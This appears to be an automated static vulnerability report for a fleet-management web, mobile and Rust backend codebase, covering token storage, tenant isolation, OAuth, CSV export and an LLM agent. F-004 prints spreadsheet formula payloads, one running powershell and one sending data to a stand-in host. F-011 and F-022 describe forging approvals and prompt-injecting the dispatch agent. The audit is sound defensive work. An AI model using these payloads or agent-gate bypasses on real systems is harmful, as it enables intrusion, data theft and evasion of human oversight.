# Altius-FTM — static vulnerability findings

Scanned 2026-09-08 · 56 findings (14 HIGH / 21 MEDIUM / 21 LOW), 2 below 0.4 confidence.

**Static review — nothing was executed.** These are candidates for `/triage`, not verified vulnerabilities. Confidence is scanner self-reported.

## Focus areas

1. TypeQL construction & TypeDB data layer
2. JWT/JWKS verification & authorization
3. Outbound integrations: Google Maps & OpenRouter agent
4. Browser auth: Keycloak PKCE, callback, token handling
5. Web data ingress/egress: parsing, export, client state
6. Flutter mobile: persistence, credentials, offline sync
7. Shared contracts (Zod) & geospatial algorithms

## Summary

| ID | Sev | Conf | Category | Location | Title |
|---|---|---|---|---|---|
| F-001 | HIGH | 0.95 | credential-storage | `apps/mobile/lib/core/data/work_store.dart:192` | Access token, refresh token and username persisted in plaintext SQLite instead of the platform keystore |
| F-002 | LOW | 0.95 | weak-randomness | `apps/web/src/lib/auth.ts:36` | randomString loses roughly a third of its entropy and emits a skewed, structured alphabet |
| F-003 | HIGH | 0.90 | cleartext-transport | `apps/mobile/lib/core/data/work_store.dart:163` | User-supplied server URL is never validated as HTTPS; credentials and tokens go over whatever scheme is typed |
| F-004 | HIGH | 0.90 | csv-injection | `apps/web/src/features/schedule-planner.tsx:136` | Schedule CSV export builds rows by raw string concatenation with no quoting, escaping, or formula guard |
| F-005 | HIGH | 0.85 | csrf | `apps/web/src/lib/auth.ts:57` | OAuth state is generated but never stored or verified on the callback |
| F-006 | HIGH | 0.85 | information-disclosure | `backend/crates/altius-api/src/maps.rs:181` | GOOGLE_MAPS_API_KEY is returned to API clients inside 503 error bodies |
| F-007 | HIGH | 0.85 | authz-bypass | `backend/crates/altius-api/src/routes.rs:218` | create_task writes into any tenant: org comes from the request body, never from the caller |
| F-008 | HIGH | 0.85 | auth-bypass | `backend/crates/altius-api/src/store.rs:235` | record_event mutates tasks and stops by raw id with no organization constraint |
| F-009 | MEDIUM | 0.85 | data-loss | `apps/web/src/data/api-adapter.ts:118` | Live adapter silently discards every task mutation while the UI reports success |
| F-010 | LOW | 0.85 | information-disclosure | `apps/mobile/lib/core/data/work_store.dart:108` | Operational PII stored in an unencrypted on-device database |
| F-011 | HIGH | 0.80 | authz-bypass | `backend/crates/altius-api/src/agent.rs:121` | agent::resume trusts client-supplied conversation state and executes the gated tool with client-chosen arguments |
| F-012 | HIGH | 0.80 | auth-bypass | `backend/crates/altius-api/src/store.rs:114` | create_task binds $o but never uses it; body-supplied hub-id plants a task in another tenant's hub |
| F-013 | MEDIUM | 0.80 | data-loss | `apps/mobile/lib/core/data/work_store.dart:387` | Sync receipts are matched to local events by array position, letting a hostile response mark arbitrary events delivered |
| F-014 | MEDIUM | 0.80 | input-validation | `apps/web/src/data/api-adapter.ts:111` | API-sourced tasks bypass Zod entirely; arbitrary backend JSON is coerced with String() into React state |
| F-015 | MEDIUM | 0.80 | token-leak | `apps/web/src/lib/auth.ts:95` | Refresh token for a public client is persisted in sessionStorage, readable by any script |
| F-016 | MEDIUM | 0.80 | authz-bypass | `backend/crates/altius-api/src/routes.rs:317` | Org-wide read routes enforce no role, and a token with zero recognized roles is a full principal |
| F-017 | HIGH | 0.75 | fail-open | `packages/algos/src/index.ts:84` | compareGpsStreams returns insufficient-data instead of review when the vehicle stream is absent or time-shifted |
| F-018 | MEDIUM | 0.75 | data-loss | `apps/mobile/lib/core/data/work_store.dart:389` | Events marked rejected are dropped from the outbox forever and are invisible in the UI |
| F-019 | LOW | 0.75 | information-disclosure | `backend/crates/altius-api/src/auth.rs:63` | Upstream reqwest error text (internal IdP/JWKS URLs) returned verbatim to unauthenticated clients |
| F-020 | HIGH | 0.70 | idor | `backend/crates/altius-api/src/routes.rs:249` | sync_events scope check is self-referential: task_id/stop_id are never constrained to the caller's tenant |
| F-021 | HIGH | 0.70 | fail-open | `packages/algos/src/index.ts:66` | evaluateCorridor reports reason 'inside' when every sample was skipped or the list is empty |
| F-022 | MEDIUM | 0.70 | prompt-injection | `backend/crates/altius-api/src/agent.rs:251` | Tool arguments are never validated against the declared JSON Schema before dispatch |
| F-023 | MEDIUM | 0.70 | numeric-handling | `packages/algos/src/index.ts:93` | aggregateDaily sums unconstrained floating-point amounts for the money path, contradicting the integer-minor-unit MoneySchema |
| F-024 | LOW | 0.70 | information-disclosure | `apps/mobile/lib/core/data/work_store.dart:205` | Logout does not clear persisted login drafts, leaving the previous driver's email and server URL on the device |
| F-025 | LOW | 0.70 | unbounded-recursion | `apps/web/src/data/api-adapter.ts:22` | leaf() recurses without a depth bound on nested single-element arrays from backend JSON |
| F-026 | LOW | 0.70 | auth-bypass | `apps/web/src/lib/auth.ts:83` | PKCE verifier is only cleared on the success path, so it survives every failure |
| F-027 | MEDIUM | 0.65 | input-validation | `packages/algos/src/index.ts:23` | dijkstra reads inherited Object.prototype keys, causing an unhandled TypeError on an adversarial node name |
| F-028 | HIGH | 0.60 | fail-open | `packages/algos/src/index.ts:82` | A single NaN coordinate poisons the running maximum and forces flag 'none' for the entire batch |
| F-029 | MEDIUM | 0.60 | authz-bypass | `backend/crates/altius-api/src/agent.rs:32` | Tool executors carry no caller identity; tools run with ambient backend privilege |
| F-030 | MEDIUM | 0.60 | toctou | `backend/crates/altius-api/src/store.rs:177` | Idempotency check-then-insert race allows duplicate event application |
| F-031 | MEDIUM | 0.60 | algorithmic-complexity | `packages/algos/src/index.ts:81` | compareGpsStreams does an O(n*m) full scan per app sample over unbounded observation arrays |
| F-032 | LOW | 0.60 | data-loss | `apps/web/src/data/api-adapter.ts:115` | A single malformed localStorage value silently discards all locally persisted preferences |
| F-033 | LOW | 0.60 | auth-bypass | `apps/web/src/features/callback.tsx:41` | Callback ignores the OAuth error response and leaves code in the URL on the failure path |
| F-034 | LOW | 0.60 | race-condition | `apps/web/src/lib/auth.ts:100` | Unserialised concurrent refresh can consume a rotated refresh token twice and wipe live credentials |
| F-035 | LOW | 0.60 | unauthenticated-outbound-amplification | `backend/crates/altius-api/src/auth.rs:77` | Unknown kid in an attacker-supplied token forces an uncached JWKS refetch per request |
| F-036 | LOW | 0.60 | auth-bypass | `backend/crates/altius-api/src/auth.rs:98` | nbf is never validated; only exp is explicitly enabled |
| F-037 | HIGH | 0.55 | authz-bypass | `backend/crates/altius-api/src/routes.rs:185` | Tenant selection falls back to an unverified organization_id token claim |
| F-038 | MEDIUM | 0.55 | auth-bypass | `apps/web/src/app/[[...path]]/view.tsx:33` | Route guard trusts a client-persisted session boolean rather than token possession |
| F-039 | MEDIUM | 0.55 | csv-injection | `apps/web/src/data/adapter.ts:41` | csvCell's formula-trigger regex is anchored at position 0, so a leading space bypasses the guard |
| F-040 | MEDIUM | 0.55 | auth-bypass | `backend/crates/altius-api/src/store.rs:178` | Idempotency keys share one global namespace across all tenants |
| F-041 | MEDIUM | 0.55 | input-validation | `packages/api-contracts/src/tasks.ts:16` | Rust DeviceEvent diverges from the '1:1' DeviceEventSchema, always in the permissive direction |
| F-042 | LOW | 0.55 | input-validation | `packages/api-contracts/src/lhs.ts:4` | ExpenseCategory enum disagrees between the Zod contract and the Rust mirror |
| F-043 | MEDIUM | 0.50 | authorization | `apps/mobile/lib/core/data/work_store.dart:350` | Tenant, hub and driver identity in the sync batch are read from locally writable preferences; stage rules enforced only on-device |
| F-044 | MEDIUM | 0.50 | input-validation | `packages/api-contracts/src/api.ts:26` | EntityDataSchema uses an unkeyed z.record with unbounded string values, permitting __proto__ keys |
| F-045 | MEDIUM | 0.50 | privilege-escalation | `packages/api-contracts/src/identity.ts:6` | MembershipSchema lets a client-supplied object assert its own role, tenant, hubs and permission list |
| F-046 | LOW | 0.50 | state-corruption | `apps/web/src/components/demo-provider.tsx:35` | Adapter write and setError execute inside a React setState updater |
| F-047 | LOW | 0.50 | missing-loop-bound | `backend/crates/altius-api/src/agent.rs:225` | Per-step tool-call fan-out is unbounded and the MAX_STEPS budget resets on every resume |
| F-048 | LOW | 0.50 | authz-bypass | `backend/crates/altius-api/src/routes.rs:368` | record_report lets the submitter choose their own approval status with no role check |
| F-049 | MEDIUM | 0.45 | privilege-escalation | `packages/api-contracts/src/lhs.ts:7` | LhsReportSchema accepts a client-authored review history that can assert its own approval |
| F-050 | LOW | 0.45 | input-validation | `apps/web/src/features/tasks.tsx:33` | validateTask is applied only on the editor submit path; assignment, arrival and completion bypass it |
| F-051 | LOW | 0.45 | improper-validation-of-third-party-response | `backend/crates/altius-api/src/maps.rs:275` | Google's waypoint_order is returned to clients as array indices without range validation |
| F-052 | LOW | 0.45 | information-disclosure | `backend/crates/altius-api/src/routes.rs:69` | Unauthenticated /api/v3/health discloses backend integration posture |
| F-053 | LOW | 0.40 | input-validation | `packages/api-contracts/src/identity.ts:9` | UserSchema.email is unbounded and memberships/hubIds arrays have no length cap |
| F-054 | LOW | 0.40 | fail-open | `packages/api-contracts/src/location.ts:19` | mockLocationReported is nullable, letting a spoofing device omit the mock-location signal |
| F-055 | MEDIUM | 0.35 | sql-injection | `backend/crates/altius-api/src/store.rs:23` | Store::esc escapes only backslash and double-quote; control characters pass into TypeQL string literals |
| F-056 | LOW | 0.35 | input-validation | `packages/algos/src/index.ts:21` | dijkstra treats an empty-string node name as 'no node found' and silently abandons the search |

### F-001 — Access token, refresh token and username persisted in plaintext SQLite instead of the platform keystore

**HIGH** · confidence 0.95 · `credential-storage` · `apps/mobile/lib/core/data/work_store.dart:192`

login() posts the credentials, reads accessToken/refreshToken/expiresIn, then writes them into the preferences table via a plain INSERT OR REPLACE. The database is an unencrypted NativeDatabase file in app support storage with WAL enabled, so token bytes also land in the -wal sidecar. A correct implementation already exists and is unused: AuthService stores the same token names in FlutterSecureStorage, but nothing in bootstrap.dart or app.dart ever constructs it. The live UI path reads the token straight back out of the plaintext table. logout() overwrites with empty strings, but SQLite does not zero freed pages.

**Exploit scenario.** A driver's phone is stolen or handed to a repair shop. The attacker pulls the sqlite and -wal files via backup extraction or a root shell, runs SELECT * FROM preferences, and reads accessToken, refreshToken, apiBase and driverId. The refresh token is replayed against Keycloak to mint fresh access tokens indefinitely, from the attacker's own machine, long after the phone is wiped.

**Recommendation.** Delete the token writes and route login through the existing AuthService/FlutterSecureStorage. Keep only non-secret workspace state in preferences. If the SQLite file must hold anything sensitive, move to SQLCipher with a keystore-held key.

### F-002 — randomString loses roughly a third of its entropy and emits a skewed, structured alphabet

**LOW** · confidence 0.95 · `weak-randomness` · `apps/web/src/lib/auth.ts:36`

Three defects compound. toString(36) on b%62 does not produce 62 symbols: residues 0-35 render as one character, 36-61 render as two ('10'..'1p'), so the output alphabet is 36 symbols and '1' is over-represented ~5x. Because ~42% of bytes emit two characters, the joined string averages ~22.7 chars for length 16 and slice(0,16) discards the tail, so only ~11.3 of 16 random bytes reach the output (~67 bits instead of ~95). And b%62 is modulo-biased: residues 0-7 occur with probability 5/256 vs 4/256. padStart(1,'0') is a no-op.

**Exploit scenario.** Once the missing state check is fixed, an attacker mounting login-CSRF must predict the state. Against this generator the search space is ~2^67 with a strongly non-uniform distribution, materially cheaper than intended. Any future reuse at a shorter length -- randomString(8) -- drops to roughly 33 bits, which is brute-forceable.

**Recommendation.** Delete randomString and use base64url(crypto.getRandomValues(new Uint8Array(32)).buffer), the primitive already present two lines above it.

### F-003 — User-supplied server URL is never validated as HTTPS; credentials and tokens go over whatever scheme is typed

**HIGH** · confidence 0.90 · `cleartext-transport` · `apps/mobile/lib/core/data/work_store.dart:163`

The login screen exposes a free-text Server URL field passed unmodified to login(). The only validation is url.isEmpty; there is no scheme check before the request is built. The plaintext password goes into the request body and the issued token into an authorization header on the follow-up fetch. The same unvalidated string is persisted as apiBase and reused for every subsequent outbox flush, so one http:// entry at login downgrades both the credential exchange and every later token-bearing sync. There is no badCertificateCallback or HttpOverrides anywhere, so TLS validation itself is intact -- the defect is that TLS can be omitted entirely.

**Exploit scenario.** A driver on depot wifi is handed a 'new server address' by a phishing message or a QR-provisioned config beginning http://. On tapping Enter the username and password cross the network in cleartext; a passive attacker on the same wifi captures the Keycloak credentials and thereafter reads and modifies every bearer token and event batch.

**Recommendation.** Reject any URL whose scheme is not https with a non-empty host, before the request is built; apply the same check to the stored apiBase at the top of syncNow since a tampered DB can still hold an http:// value. Set usesCleartextTraffic=false and iOS ATS with no exceptions as a backstop.

### F-004 — Schedule CSV export builds rows by raw string concatenation with no quoting, escaping, or formula guard

**HIGH** · confidence 0.90 · `csv-injection` · `apps/web/src/features/schedule-planner.tsx:136`

csv() assembles the export by joining nine fields with commas and never calls csvCell -- the codebase's own escaping helper, which is not imported into this file. Three columns are verbatim backend-controlled strings (task.title, task.address, task.notes) and one is task.assignee. Those come from toTask, which coerces raw backend JSON with bare String() and applies no schema, so there is no length limit, character filter, or trim. Two injections are possible: spreadsheet formula execution, and CSV structure injection via an embedded comma, quote or newline.

**Exploit scenario.** A low-privilege tenant user creates a task titled `=cmd|'/c powershell ...'!A1` or `=HYPERLINK("http://evil/?d="&A2,"Open report")`. A dispatcher exports the schedule and opens it; Excel prompts for the DDE link or renders the hyperlink, leading to command execution or leakage of neighbouring row data. Alternatively an embedded newline in notes forges an entire authentic-looking schedule row.

**Recommendation.** Reuse the existing helper: map every cell (including the header row) through csvCell and join lines with CRLF, mirroring tasksCsv. [FIXED in-tree during this session.]

### F-005 — OAuth state is generated but never stored or verified on the callback

**HIGH** · confidence 0.85 · `csrf` · `apps/web/src/lib/auth.ts:57`

startLogin builds the authorize URL with state: randomString(16), but that value is never persisted -- contrast the PKCE verifier, which is written to sessionStorage -- and STORAGE has no state key. On the return leg, Callback reads only `code`; state, session_state and iss are never read, and finishLogin has no parameter that could carry a state to compare. The callback therefore accepts any code presented in the URL by any origin. PKCE is a partial mitigation, but the request-forgery defence state exists to provide is entirely absent.

**Exploit scenario.** An attacker page navigates the victim's browser to /callback?code=ATTACKER_CODE. Callback accepts it unconditionally and POSTs it to Keycloak with whatever verifier is still in sessionStorage. If the client does not strictly enforce PKCE, the victim is silently signed in to the attacker's account and subsequent data lands in the attacker's tenant. Even with PKCE enforced, any third-party site can force repeated failed exchanges at will.

**Recommendation.** Persist the state alongside the verifier in startLogin, read params.get('state') in the callback, compare before calling finishLogin, and abort on mismatch or absence. Remove the stored state on every exit path, and generate it with the same crypto.getRandomValues primitive already used for the verifier.

### F-006 — GOOGLE_MAPS_API_KEY is returned to API clients inside 503 error bodies

**HIGH** · confidence 0.85 · `information-disclosure` · `backend/crates/altius-api/src/maps.rs:181`

MapsClient::get passes the API key as a query parameter and, on a transport failure, wraps the raw reqwest::Error into ApiError::Unavailable. reqwest attaches the full request URL to send-path errors and its Display prints it verbatim with no query redaction, so the formatted string contains `...&key=<GOOGLE_MAPS_API_KEY>`. Unavailable is serialized straight back to the caller as the 503 body. Reachable by any authenticated principal: geocode, autocomplete, eta and optimize_route have no role check.

**Exploit scenario.** A driver-role user polls POST /route/geocode on a loop. On any egress hiccup toward maps.googleapis.com the endpoint answers 503 with the full URL including the key. The attacker can then bill arbitrary Maps usage to the org. Second path: the same string is fed to OpenRouter as a tool result and can be echoed in the model's answer.

**Recommendation.** Never interpolate a reqwest::Error into a client-visible message: log it and return a constant. Send the key in the X-Goog-Api-Key header instead of the query string so it can never appear in a URL. [FIXED in-tree during this session: ApiError::upstream helper.]

### F-007 — create_task writes into any tenant: org comes from the request body, never from the caller

**HIGH** · confidence 0.85 · `authz-bypass` · `backend/crates/altius-api/src/routes.rs:218`

create_task is the only write path that skips org_of entirely. Its sole check is a deny-list `if principal.has_role(Role::Driver) { Forbidden }`. It passes the deserialized body straight to store.create_task, and Task carries client-supplied id, tenant_id and hub_id which the store uses verbatim. Nothing compares tenant_id to the caller's organization.

**Exploit scenario.** Any bearer token whose realm roles do not include driver -- including a token with no recognized role at all, since Jwks::validate silently drops unknown role strings -- posts a task with an arbitrary tenant_id. The task is inserted into the victim organization and returned to its users by GET /tasks.

**Recommendation.** Resolve the org server-side and overwrite or reject task.tenant_id. Validate hub_id is allocated to that org. Replace the deny-check with an explicit allow-list, and server-generate task.id. [FIXED in-tree during this session.]

### F-008 — record_event mutates tasks and stops by raw id with no organization constraint

**HIGH** · confidence 0.85 · `auth-bypass` · `backend/crates/altius-api/src/store.rs:235`

record_event resolves every entity purely by client-supplied id and never joins through allocation/located/membership to the caller's org. The stop stage read, the `match $t isa task, has task-id` link, the stop stage delete+rewrite, and the task stage roll-forward are all selected by id alone. Contrast tasks_for_org/task_by_id, which do constrain via allocation+located. The sync_events handler only validates the tenant_id/hub_id fields the client itself supplied; task_id and stop_id are never checked against that scope.

**Exploit scenario.** A driver in org A posts an event whose tenantId/hubId are their own (passing the handler check) but whose taskId/stopId belong to org B. record_event reads org B's stop stage, rewrites it, links an attacker-controlled device-event into org B's graph, and flips org B's task to in_progress. Cross-tenant corruption of proof-of-service state.

**Recommendation.** Thread the caller's resolved org through record_event and constrain every task/stop lookup by it, mirroring task_by_id. Require the stop to be reachable from the task via `contains` rather than looked up globally, and fail when the match is empty.

### F-009 — Live adapter silently discards every task mutation while the UI reports success

**MEDIUM** · confidence 0.85 · `data-loss` · `apps/web/src/data/api-adapter.ts:118`

save() writes only preferences with tasks stripped to an empty array, and the adapter exposes no write path to the API at all -- request() is called exactly once, from load(), with no POST/PUT/PATCH anywhere in the file. Every task mutation is dropped: create, edit, single and bulk assignment, arrival/completion timestamps, bulk delete. Because save() returns normally, the provider's try/catch never fires, no error banner appears, and the success toasts fire unconditionally.

**Exploit scenario.** A dispatcher reassigns twelve tasks and marks three completed; each action shows a success toast. Nothing is persisted. After a reload the board shows the original assignments and statuses, and the operational record of who was dispatched where is gone. In field operations this is a silent integrity failure in the audit trail.

**Recommendation.** Either implement the API write path in save(), or make the drop explicit: throw when the state's tasks differ from the last loaded set so the existing error handling surfaces it, and gate the success toasts on an actual persisted result.

### F-010 — Operational PII stored in an unencrypted on-device database

**LOW** · confidence 0.85 · `information-disclosure` · `apps/mobile/lib/core/data/work_store.dart:108`

The store opens a plain unencrypted NativeDatabase at a fixed path. It holds, in cleartext: customer street addresses, the driver's login identity, free-text expense notes and amounts, and per-event JSON payloads embedding organization, hub and a proof draft. WAL is enabled so recent rows also persist in the sidecar. The sequence of arrived/working/done events with timestamps reconstructs where a named driver was, when, and for which customer.

**Exploit scenario.** A driver's phone is lost or resold without a wipe, or an unencrypted backup is extracted. The finder opens the SQLite file with any viewer and obtains the hub's full customer address book, the named driver's daily movement timeline, and their expense records -- enough for competitor route intelligence or to target a specific delivery.

**Recommendation.** Encrypt the database at rest (SQLCipher with a key in FlutterSecureStorage, already a dependency), and prune synced events, costs and reports after a bounded retention window.

### F-011 — agent::resume trusts client-supplied conversation state and executes the gated tool with client-chosen arguments

**HIGH** · confidence 0.80 · `authz-bypass` · `backend/crates/altius-api/src/agent.rs:121`

The human-in-the-loop gate is the only control between model output and tool execution. resume takes three fully client-controlled inputs and validates none against each other: messages_json is deserialized with only a shape check (Message.role is a free String, so an arbitrary system message is accepted), pending_call is taken from the request body rather than saved state, and on Approve the code looks the tool up by the client-supplied name and runs it with the client-supplied arguments. Nothing checks that pending_call.id corresponds to any tool_calls entry, that a model ever proposed this call, or even that tool.gated is true.

**Exploit scenario.** A Supervisor token posts a resume body with a forged system message and a fabricated call id naming plan_route with 200 attacker-chosen coordinates. resume executes it against the server's Distance Matrix key, and the forged system message replaces the dispatch prompt for the rest of the run, so the org's OpenRouter account answers arbitrary prompts. Once any mutating tool is registered, this writes data no human approved while the audit trail shows an 'approved' call whose proposal never existed.

**Recommendation.** Persist the paused run server-side keyed by an opaque run id; accept only {run_id, decision, reason} and execute only the stored pending call's arguments. Re-check the resuming principal is authorized for that run. If server-side state is not an option, HMAC the state. Assert tool.gated before executing.

### F-012 — create_task binds $o but never uses it; body-supplied hub-id plants a task in another tenant's hub

**HIGH** · confidence 0.80 · `auth-bypass` · `backend/crates/altius-api/src/store.rs:114`

The create_task query matches `$o isa organization, has org-id "{org}"` and `$h isa hub, has hub-id "{hub}"` but the insert links only `located (task: $t, hub: $h)`. There is no `allocation (org: $o, hub: $h)` clause, so $o is decorative. Both values came from the request body (task.tenant_id, task.hub_id) with no comparison against the caller's resolved org.

**Exploit scenario.** An admin in org A posts a task with their own tenantId (so the $o match succeeds) and a hubId belonging to org B. The task is located at org B's hub and appears in org B's dashboard. Also supports task-id squatting, since task-id is @key. A non-existent tenantId makes the match empty, the insert silently writes nothing, and the handler still returns 200.

**Recommendation.** Add `allocation (org: $o, hub: $h)` to the match and pass the org resolved from the principal instead of trusting the body. Treat a zero-row match as an error rather than success. [FIXED in-tree during this session.]

### F-013 — Sync receipts are matched to local events by array position, letting a hostile response mark arbitrary events delivered

**MEDIUM** · confidence 0.80 · `data-loss` · `apps/mobile/lib/core/data/work_store.dart:387`

syncNow collects pending rows, builds a batch and a parallel syncable list, and posts them. The response is parsed with no correlation: the loop zips receipts to local events purely by index. Each receipt carries an event_id in the request but the response's identifier is never read or compared. A response whose data array is reordered, truncated, padded or fabricated stamps events with a status belonging to a different event. Because the pending query selects only delivery='pending', any row stamped accepted or rejected is permanently removed from the outbox -- no code path ever sets it back.

**Exploit scenario.** The driver's apiBase is http:// or they are pointed at a rogue endpoint. They finish a shift with 8 pending events and tap Sync. The attacker's proxy returns 8 'accepted' receipts while forwarding nothing to the real backend. All 8 rows are flipped, disappear from the pending count, and can never be resent. That day's proof-of-service events are permanently lost.

**Recommendation.** Match receipts by identity: index the response by event_id and update only the row whose id equals it. Treat a missing receipt as still pending. Validate the response shape explicitly and fail the whole batch, leaving every row pending, rather than falling through to the index loop.

### F-014 — API-sourced tasks bypass Zod entirely; arbitrary backend JSON is coerced with String() into React state

**MEDIUM** · confidence 0.80 · `input-validation` · `apps/web/src/data/api-adapter.ts:111`

load() fetches /tasks, maps each element through toTask and returns them with no schema applied -- the only validation is Array.isArray. toTask coerces every field with bare String(), so the model's invariants (title 2..120, address 3..240, notes max 2000, trim) hold nowhere for live data. An object becomes '[object Object]', an array becomes a comma-joined string (itself a CSV structure-injection primitive), and lengths are unbounded. Only status and priority are constrained.

**Exploit scenario.** The backend returns a task whose title is the array ['a','=2+5+cmd|...']. String() yields 'a,=2+5+cmd|...', which the schedule exporter writes as two CSV columns and which tasksCsv accepts because its guard only looks at character 0. An oversized notes field propagates with no cap.

**Recommendation.** Run the mapped array through z.array(taskSchema) in load(), mirroring what createLocalAdapter.load() already does for localStorage. Reject non-string leaves in toTask rather than String()-coercing them.

### F-015 — Refresh token for a public client is persisted in sessionStorage, readable by any script

**MEDIUM** · confidence 0.80 · `token-leak` · `apps/web/src/lib/auth.ts:95`

storeTokens writes both the access token and the refresh token to sessionStorage, readable by any JavaScript on the origin. The access token is short-lived; the refresh token is not, and the client is a public OAuth client -- finishLogin and the refresh call send only client_id, no secret. An exfiltrated refresh token is therefore independently replayable from any machine with no browser, no cookie and no origin check.

**Exploit scenario.** Any script-execution foothold -- a compromised npm dependency, a malicious extension, a third-party tag -- posts sessionStorage's refresh token to an attacker host. The attacker replays it against Keycloak's token endpoint from their own infrastructure, minting access tokens indefinitely long after the victim closes the tab. Nothing in this code revokes the token: logout() only deletes local keys.

**Recommendation.** Do not persist the refresh token for a public client. Keep tokens in a module-scoped variable and rely on the Keycloak SSO cookie plus silent re-authorization, or move the exchange to a server-side BFF holding tokens behind an HttpOnly cookie. At minimum call the end-session endpoint from logout().

### F-016 — Org-wide read routes enforce no role, and a token with zero recognized roles is a full principal

**MEDIUM** · confidence 0.80 · `authz-bypass` · `backend/crates/altius-api/src/routes.rs:317`

Only four routes check roles (create_task, sync_events, dispatch_suggestion, agent_resume). list_tasks, get_task, list_users, list_hubs, list_drivers, record_cost, list_costs, record_report, list_reports, eta, optimize_route, geocode and autocomplete check none. Compounding this, Jwks::validate builds the role set with filter_map over a match that maps only four strings and drops everything else, so a token with only unrecognized roles yields an empty role vec -- and nothing requires a non-empty role set.

**Exploit scenario.** A driver-role user, or any realm account with no fleet role at all, calls GET /users and GET /drivers and receives the organization's complete roster; GET /tasks returns every task in the org including customer names and addresses, not just their own assignments.

**Recommendation.** Add an explicit role gate per route (rosters -> Admin|Supervisor|Lead; list_tasks/get_task -> filter by assignee for a Driver), and reject a principal with an empty role set in the extractor. [PARTIALLY FIXED in-tree: a require_staff helper was added during this session.]

### F-017 — compareGpsStreams returns insufficient-data instead of review when the vehicle stream is absent or time-shifted

**HIGH** · confidence 0.75 · `fail-open` · `packages/algos/src/index.ts:84`

compareGpsStreams decides whether app GPS and vehicle GPS disagree enough to warrant review. A pair counts as matched only when the time delta is within maxTimeGapMs, and the function then short-circuits: matched===0 returns flag 'insufficient-data'. The only value signalling a problem is 'review', so a caller branching on that treats total absence of corroborating data identically to a clean result. Attacker control is complete: the vehicle array is built from device-supplied observations whose occurredAtUtc is any RFC3339 instant, and the history schema places no minimum on the observations array, so an empty vehicle stream validates.

**Exploit scenario.** A driver spoofs app GPS to show the vehicle on-route while physically elsewhere. To defeat the cross-stream check the device simply stops uploading vehicle_gps observations, or offsets their timestamps by 30 s. Both validate. The comparison returns insufficient-data, never review, no supervisor is alerted, and falsified mileage flows into the LHS report and the reimbursement path.

**Recommendation.** Make absence of corroboration a flagged state: return a review-equivalent severity when matched===0 and the app stream is non-empty, or return a discriminated union with no safe default. Enforce a minimum match ratio rather than matched>0, and add minimum-length and clock-skew bounds to the observation schema.

### F-018 — Events marked rejected are dropped from the outbox forever and are invisible in the UI

**MEDIUM** · confidence 0.75 · `data-loss` · `apps/mobile/lib/core/data/work_store.dart:389`

Any receipt whose status is not exactly 'accepted' is coerced to 'rejected' and written to the row. The outbox query selects only pending, and no code anywhere restores a row to pending -- retrySync only writes two preference strings and touches no event row. The Settings screen counts only pending, and the task timeline hard-codes the 'pending' label regardless of the actual delivery value, so a rejected event is neither retried nor surfaced.

**Exploit scenario.** The backend answers mid-deploy with status 'retry', intending a resend. The client writes 'rejected', the event leaves the pending set, Settings reports 0 pending, and the completed-delivery record is never transmitted. No error is raised because the HTTP status was 200, so the loss is discovered only in a downstream reconciliation, if at all.

**Recommendation.** Restrict terminal states to statuses the contract defines and map anything unrecognized back to pending. Persist a rejection reason and attempt counter, surface undelivered non-pending events in the outbox list, and do not clear syncError when any event came back non-accepted.

### F-019 — Upstream reqwest error text (internal IdP/JWKS URLs) returned verbatim to unauthenticated clients

**LOW** · confidence 0.75 · `information-disclosure` · `backend/crates/altius-api/src/auth.rs:63`

ApiError::Unavailable(m) renders m straight into the 503 body, unlike Internal which is correctly redacted. Three sites feed attacker-reachable upstream errors into it: jwks fetch/parse in auth.rs, reachable from any request bearing a token, and idp unreachable in the token exchange, reachable from the unauthenticated login and refresh endpoints. A reqwest::Error's Display embeds the full request URL and transport cause.

**Exploit scenario.** An unauthenticated client posts to /auth/refresh while the IdP is unreachable. The 503 body returns the internal Keycloak host, port, path and scheme -- mapping internal service topology for the attacker.

**Recommendation.** Log the error with tracing and return a fixed client-facing string, as ApiError::Internal already does. [FIXED in-tree during this session: ApiError::upstream helper added and all reqwest-error sites converted.]

### F-020 — sync_events scope check is self-referential: task_id/stop_id are never constrained to the caller's tenant

**HIGH** · confidence 0.70 · `idor` · `backend/crates/altius-api/src/routes.rs:249`

sync_events resolves the caller's real scope from the store, then validates `ev.tenant_id != scope.0 || ev.hub_id != scope.1`. That only proves the attacker copied their own org/hub into the body; it establishes no relationship between those declared fields and the object actually mutated, which is selected by ev.task_id and ev.stop_id. ev.driver_id is not compared to principal.subject and is not written at all, so events are also not attributable.

**Exploit scenario.** A driver in tenant A posts an event declaring their own org and hub but a taskId/stopId from tenant B. record_event advances tenant B's stop to completed and flips tenant B's task to in_progress. The same primitive works intra-tenant to forge another driver's deliveries, since driver_id is ignored.

**Recommendation.** Constrain the write to the caller: match the task through the org/hub relation and the stop through `contains`, passing the server-resolved scope. Reject events whose driver_id != principal.subject and persist the driver relation on the event.

### F-021 — evaluateCorridor reports reason 'inside' when every sample was skipped or the list is empty

**HIGH** · confidence 0.70 · `fail-open` · `packages/algos/src/index.ts:66`

evaluateCorridor decides whether a driver went off-route. It skips any sample whose self-reported accuracyMeters exceeds the threshold. If every sample is skipped, or samples is empty, the loop body never runs and the function returns offRoute:false, distanceMeters:0, reason:'inside' -- an affirmative claim of being on the corridor, produced from zero evidence. The type has an 'inaccurate' reason that this function never actually returns. accuracyMeters is device-supplied and constrained only to finite and non-negative, with no upper bound.

**Exploit scenario.** A driver detours off the corridor. Their modified client reports every observation with accuracyMeters 5000 -- legal, since there is no maximum. Every sample is skipped and the function reports the driver as on-route with an implied 0 m deviation. A lower-effort variant interleaves one position-null observation between every two off-corridor samples: the NaN distance resets the consecutive-breach streak so the threshold is never reached.

**Recommendation.** Track how many samples were actually evaluated and return 'inaccurate' when that count is zero. Only reset the streak on a verified finite in-corridor distance. Add a maximum bound on accuracyMeters and reject batches where the skipped share exceeds a threshold.

### F-022 — Tool arguments are never validated against the declared JSON Schema before dispatch

**MEDIUM** · confidence 0.70 · `prompt-injection` · `backend/crates/altius-api/src/agent.rs:251`

Tool::parameters is advertised to the model but never used as a validator on the way back. drive parses the argument blob with serde_json::from_str(...).unwrap_or(json!({})) and hands the Value straight to exec. Malformed arguments are silently coerced to {} rather than rejected. Tool selection is by model-supplied name only, and the model's output is steerable by whatever text reaches the prompt -- dispatch_suggestion serializes an arbitrary client Value into the user message, with a one-line system-prompt instruction as the only mitigation.

**Exploit scenario.** A driver-writable field (an event note, a delivery address) contains injected instructions. A supervisor's dispatch client bundles that record into the prompt; the model emits a tool call whose arguments bear no resemblance to the declared schema, and the framework accepts them as-is. The approver sees only a tool name and an argument blob.

